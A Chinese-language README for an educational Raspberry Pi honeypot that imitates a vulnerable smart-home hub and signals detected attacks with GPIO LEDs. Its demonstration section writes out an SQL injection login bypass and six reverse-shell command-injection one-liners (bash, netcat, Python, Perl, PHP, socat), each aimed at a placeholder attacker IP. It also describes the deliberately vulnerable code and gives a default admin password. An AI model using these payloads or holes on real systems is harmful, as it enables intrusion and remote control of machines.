# IoT Honeypot — 智慧家庭蜜罐系統

基於 Raspberry Pi 的 IoT 蜜罐系統，模擬一個存在漏洞的智慧家庭管理平台（SmartHome IoT Hub），並透過 GPIO LED 即時警示攻擊行為。

> **警告：本專案包含故意設計的安全漏洞（SQL Injection、Command Injection），僅供資安教育與研究用途。請勿部署於公開網路環境。**

## 系統架構

```
                         攻擊者
                           │
                      Port 8080
                           │
┌──────────────────────────┼──────────────────────────┐
│  Raspberry Pi            │                          │
│                          ▼                          │
│  ┌─────────────────────────────────────────────┐    │
│  │            Docker Compose                   │    │
│  │                                             │    │
│  │  ┌───────────┐    ┌───────────┐             │    │
│  │  │    db      │◄───│  web-app  │◄── HTTP    │    │
│  │  │ MariaDB   │    │ PHP 8.2 + │   Request   │    │
│  │  │           │    │  Apache   │             │    │
│  │  └───────────┘    └─────┬─────┘             │    │
│  │                         │                   │    │
│  │                   docker.sock               │    │
│  │                         │                   │    │
│  │                  ┌──────┴──────┐             │    │
│  │                  │  defense-   │             │    │
│  │                  │  system     │             │    │
│  │                  │  Python 3.9 │             │    │
│  │                  └──────┬──────┘             │    │
│  │                         │                   │    │
│  └─────────────────────────┼───────────────────┘    │
│                            │                        │
│                       GPIO (BCM)                    │
│                     ┌──────┼──────┐                 │
│                     ▼      ▼      ▼                 │
│                  LED1   LED2   LED3                  │
│                GPIO 22 GPIO 24 GPIO 25              │
│               /admin   SQLi   Reverse               │
│                探測     繞過    Shell                 │
└─────────────────────────────────────────────────────┘
```

## 專案結構

```
iot-honeypot/
├── docker-compose.yml        # 服務編排（db + web-app + defense-system）
├── .env                      # 資料庫環境變數
├── .gitignore
├── defense/
│   ├── Dockerfile            # Python 3.9 + Docker CLI + RPi.GPIO
│   ├── monitor.py            # 防禦監控主程式（雙執行緒）
│   └── requirements.txt      # Python 相依套件
├── web/
│   ├── Dockerfile            # PHP 8.2 + Apache + Reverse Shell 工具
│   └── src/
│       ├── index.php             # 首頁（SmartHome IoT Hub 公開頁面）
│       ├── admin_login_v2.php    # 管理員登入頁（含 SQL Injection 漏洞）
│       ├── dashboard.php         # 後台儀表板（商品管理）
│       ├── network.php           # 網路診斷頁（含 Command Injection 漏洞）
│       ├── logout.php            # 登出處理
│       ├── setup_db.php          # 資料庫初始化腳本
│       ├── .htaccess             # URL Rewrite + 封鎖 setup_db.php
│       ├── css/
│       │   └── bootstrap.min.css
│       └── js/
│           └── bootstrap.bundle.min.js
└── docs/
    ├── sequence-diagrams.puml    # 時序圖（PlantUML）
    ├── flowchart.puml            # 程式邏輯流程圖（PlantUML）
    └── experiment-flowchart.puml # 實驗進行流程圖（PlantUML）
```

## 三大偵測機制

### LED1 — 路徑探測警示（GPIO 22）

透過 `docker logs -f` 串流讀取 Web Container 的 Docker Log，使用 Regex 比對：

```
GET /admin[\s/?]
```

當攻擊者嘗試存取 `/admin` 路徑時，LED1 常亮。

### LED2 — SQL Injection 繞過警示（GPIO 24）

同樣透過 Docker Log 監控，分析 HTTP Status Code：

```
"GET /dashboard\.php\b[^"]*"\s+200\b
```

當 `dashboard.php` 回傳 HTTP 200（代表驗證機制已被繞過），LED2 常亮。

### LED3 — Reverse Shell 警示（GPIO 25）

透過 `docker exec` 在 Web Container 內持續執行 `netstat -tn`，取得網路連線快照。偵測邏輯採用兩層過濾：

1. **Local Port 過濾**：排除 Local Port 為 80 的連線（正常 HTTP 請求）
2. **IP Whitelist 過濾**：排除 Whitelist 內的 IP（容器間內部通訊）

Whitelist 啟動時自動建立，包含：

| 網段 | 用途 |
|------|------|
| `127.0.0.0/8` | Loopback |
| `169.254.0.0/16` | Link-local |
| Docker Subnet（自動偵測） | 容器間內部通訊 |

一旦偵測到 Local Port 非 80 且目標連線 IP 不在 Whitelist 中的 ESTABLISHED 連線，判定為 Reverse Shell，LED3 常亮。

## 環境需求

- Raspberry Pi（建議 Pi 4，需有 GPIO）
- Raspberry Pi OS（64-bit 建議）
- Docker 與 Docker Compose
- 三顆 LED + 220Ω 電阻，接線至 GPIO 22、24、25（BCM 模式）

## 快速部署

```bash
# 1. Clone 專案
git clone https://github.com/<your-username>/iot-honeypot.git
cd iot-honeypot

# 2. 啟動所有服務
docker compose up -d

# 3. 初始化資料庫（首次部署需要，等容器完全啟動約 10 秒後執行）
docker exec web-app php /var/www/html/setup_db.php

# 4. 確認服務狀態
docker compose ps
```

部署完成後，蜜罐網站可透過 `http://<Pi_IP>:8080` 存取。

## 攻擊演示流程

### 階段一：路徑探測（觸發 LED1）

```bash
curl http://<Pi_IP>:8080/admin
```

### 階段二：SQL Injection（觸發 LED2）

1. 進入登入頁面 `http://<Pi_IP>:8080/admin`
2. 使用 SQL Injection Payload 登入：
   - 帳號：`' OR '1'='1' --`
   - 密碼：任意值
3. 成功繞過驗證進入 `dashboard.php`，LED2 亮起

### 階段三：Command Injection + Reverse Shell（觸發 LED3）

1. 登入後進入「網路診斷」頁面
2. 攻擊者先在本機開啟 Listener：
   ```bash
   nc -lvnp 4444
   ```
3. 在 IP 輸入欄位注入指令，建立 Reverse Shell（以下擇一）：

   **Bash**
   ```
   ; bash -i >& /dev/tcp/<攻擊者IP>/4444 0>&1
   ```

   **Netcat**
   ```
   ; nc -c sh <攻擊者IP> 4444
   ```

   **Python3**
   ```
   ; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<攻擊者IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
   ```

   **Perl**
   ```
   ; perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(4444,inet_aton("<攻擊者IP>")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i")'
   ```

   **PHP**
   ```
   ; php -r '$sock=fsockopen("<攻擊者IP>",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
   ```

   **Socat**
   ```
   ; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<攻擊者IP>:4444
   ```

4. Container 對外建立連線，LED3 亮起

## 技術棧

| 元件 | 技術 |
|------|------|
| 蜜罐網站 | PHP 8.2、Apache、Bootstrap 5 |
| 資料庫 | MariaDB 10.6 |
| 防禦監控 | Python 3.9、RPi.GPIO |
| 容器化 | Docker、Docker Compose |
| 偵測方式 | Docker Log 分析、Netstat 連線快照 |

## Web Container 內建工具

| 工具 | 用途 |
|------|------|
| `bash` | Bash Reverse Shell |
| `nc` (netcat-traditional) | Netcat Reverse Shell（支援 `-e` 參數） |
| `python3` | Python Reverse Shell |
| `perl` | Perl Reverse Shell |
| `php` | PHP Reverse Shell（容器內建） |
| `socat` | Socat Reverse Shell |
| `curl` | 下載惡意腳本 |
| `ping` | 網路診斷頁面使用 |

## GPIO 接線圖

```
Raspberry Pi GPIO（BCM 模式）
─────────────────────────────
GPIO 22 ──── 220Ω ──── LED1（/admin 探測）──── GND
GPIO 24 ──── 220Ω ──── LED2（SQLi 繞過）──── GND
GPIO 25 ──── 220Ω ──── LED3（Reverse Shell）──── GND
```

## 注意事項

- 所有 LED 觸發後**保持常亮**，不會自動熄滅（需重啟服務重置）
- 非 Raspberry Pi 環境會自動以**模擬模式**運行（僅輸出日誌，不控制 GPIO）
- `setup_db.php` 已透過 `.htaccess` 封鎖 HTTP 存取，僅可透過 CLI 執行
- 預設管理員帳號：`admin` / `sm@rtH0me2024!`
